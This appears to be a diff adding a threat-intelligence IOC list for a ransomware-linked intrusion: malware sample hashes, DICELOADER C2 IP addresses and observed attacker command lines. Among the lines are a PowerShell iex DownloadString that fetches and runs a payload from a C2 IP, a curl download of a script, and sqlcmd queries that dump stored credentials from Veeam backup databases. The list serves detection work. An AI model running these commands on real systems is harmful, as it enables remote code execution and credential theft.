@@ -1,0 +1,50 @@
+Indicator type,Value,Note
+SHA1,8687b6b1508a93556d6e30d14e5c4ee9971f2d80,"POWERTRASH ""icsnd16_64refl.ps1"" sample"
+SHA1,b621f8c5e9033718b4e9d47a2f0eccb9783f612a,"DUBLOADER ""libcurl.dll"" sample"
+SHA1,e5480a47172e3f75dbf0384f4ca82c7b47910e0f,"POWERTRASH ""icbt11801_64refl.ps1"" sample"
+IP,217.12.206.176,DICELOADER C2
+IP,162.248.225.115,DICELOADER C2
+IP,45.136.199.128,DICELOADER C2
+IP,91.149.243.181,DICELOADER C2
+IP,91.199.147.152,DICELOADER C2
+IP,95.217.49.123,DICELOADER C2
+IP,77.75.230.112,DICELOADER C2
+IP,194.87.148.41,DICELOADER C2
+IP,195.123.244.162,DICELOADER C2
+Command line,powershell.exe -noni -nop -exe bypass -f \\XXX.XXX.XXX.XXX\ADMIN$\temp\nFcv5ke38cnE.ps1,Lateral movement - POWERTRASH script execution
+Command line,powershell.exe -noni -nop -exe bypass -f \\XXX.XXX.XXX.XXX\ADMIN$\temp\8MDg144UDiaz.ps1 \\XXX.XXX.XXX.XXX\ADMIN$\temp\tjRoG0vVn8OE.log,Lateral movement - Recon/Discovery script execution
+Command line,"C:\Windows\system32\cmd.exe /c powershell.exe -ex bypass -Command ""iex ((New-Object Net.WebClient).DownloadString('http://91.199.147.152/icsnd16_64refl.ps1'))""",POWERTRASH download and execution
+Command line,"powershell.exe -ex bypass -noprof -nolog -nonint -f ""C:\Windows\TEMP\934F.ps1""",PowerShell execution command
+Command line,curl -O https://temp.sh/eJkTm/gup18.ps1,"Download POWERHOLD ""gup18.ps1"""
+Command line,whoami,Hands-on command
+Command line,systeminfo,Hands-on command
+Command line,ping -n 1 -a XXX.XXX.XXX.XXX,Hands-on command
+Command line,"wmic /user:""REDACTED"" /password:""REDACTED"" /node:""XXX.XXX.XXX.XXX"" process list brief",Hands-on command
+Command line,net use w: \\XXX.XXX.XXX.XXX\c$ /user:XXX.XXX.XXX.XXX\REDACTED REDACTED,Hands-on command
+Command line,net use w: /d /y,Hands-on command
+Command line,"WMIC LOGICALDISK GET Name,Size,FreeSpace",Hands-on command
+Command line,ipconfig /all,Hands-on command
+Command line,tasklist /v,Hands-on command
+Command line,netstat -aon,Hands-on command
+Command line,nslookup myip.opendns.com. resolver1.opendns.com,Hands-on command
+Command line,"reg query ""HKLM\software\veeam\veeam backup and replication""",Hands-on command
+Command line,"sqlcmd.exe -S localhost\VEEAMSQL2016 -E -Q ""use VeeamBackup-2 SELECT top 100 * FROM Credentials;""",Hands-on command
+Command line,"sqlcmd.exe -S localhost\VEEAMSQL2016 -E -Q ""use VeeamBackup SELECT top 100 * FROM JobSourceRepositories;""",Hands-on command
+Command line,"sqlcmd.exe -S localhost\VEEAMSQL2016 -E -Q ""use VeeamBackup SELECT top 100 * FROM BJobs.VSphereInfo;""",Hands-on command
+Command line,"sqlcmd.exe -S localhost\VEEAMSQL2016 -E -Q ""use VeeamBackup SELECT top 100 * FROM SmbFileShares;""",Hands-on command
+Command line,"sqlcmd.exe -S localhost\VEEAMSQL2016 -E -Q ""use VeeamBackup SELECT top 100 * FROM VSphere.Workspaces;""",Hands-on command
+Command line,"sqlcmd.exe -S localhost\VEEAMSQL2016 -E -Q ""use VeeamBackup SELECT top 100 * FROM ObjectsInBackups;""",Hands-on command
+Command line,"sqlcmd.exe -S localhost\VEEAMSQL2016 -E -Q ""use VeeamBackup SELECT top 100 * FROM BackupRepositories;""",Hands-on command
+Command line,"sqlcmd.exe -S localhost\VEEAMSQL2016 -E -Q ""use VeeamBackup SELECT top 100 * FROM PhysicalHosts;""",Hands-on command
+Command line,"sqlcmd.exe -S localhost\VEEAMSQL2016 -E -Q ""use VeeamBackup SELECT top 100 * FROM Ssh_creds;""",Hands-on command
+Command line,"sqlcmd.exe -S localhost\VEEAMSQL2016 -E -Q ""use VeeamBackup SELECT top 100 * FROM HostNetwork;""",Hands-on command
+Command line,"sqlcmd.exe -S localhost\VEEAMSQL2016 -E -Q ""use VeeamBackup SELECT top 100 * FROM HostCreds;""",Hands-on command
+Command line,"sqlcmd.exe -S localhost\VEEAMSQL2016 -E -Q ""use VeeamBackup SELECT top 100 * FROM Backups;""",Hands-on command
+Command line,"sqlcmd.exe -S localhost\VEEAMSQL2016 -E -Q ""use VeeamBackup SELECT top 100 * FROM Locations;""",Hands-on command
+Command line,"sqlcmd.exe -S localhost\VEEAMSQL2016 -E -Q ""use VeeamBackup SELECT top 100 * FROM BJobs;""",Hands-on command
+Command line,"sqlcmd.exe -S localhost\VEEAMSQL2016 -E -Q ""use VeeamBackup SELECT top 100 * FROM PhysicalHostsServersLink;""",Hands-on command
+Command line,"sqlcmd.exe -S localhost\VEEAMSQL2016 -E -Q ""use VeeamBackup SELECT top 100 * FROM ObjectsInJobs;""",Hands-on command
+Command line,"sqlcmd.exe -S localhost\VEEAMSQL2016 -E -Q ""use VeeamBackup SELECT top 100 * FROM Hosts;""",Hands-on command
+Command line,"sqlcmd.exe -S localhost\VEEAMSQL2016 -E -Q ""use VeeamBackup SELECT top 100 * FROM JobVssCredsView;""",Hands-on command
+Command line,"sqlcmd.exe -S localhost\VEEAMSQL2016 -E -Q ""use VeeamBackup SELECT top 100 * FROM HostsByJobs;""",Hands-on command
+Command line,"sqlcmd.exe -S localhost\VEEAMSQL2016 -E -Q ""use VeeamBackup SELECT top 100 * FROM HostCreds;""",Hands-on command
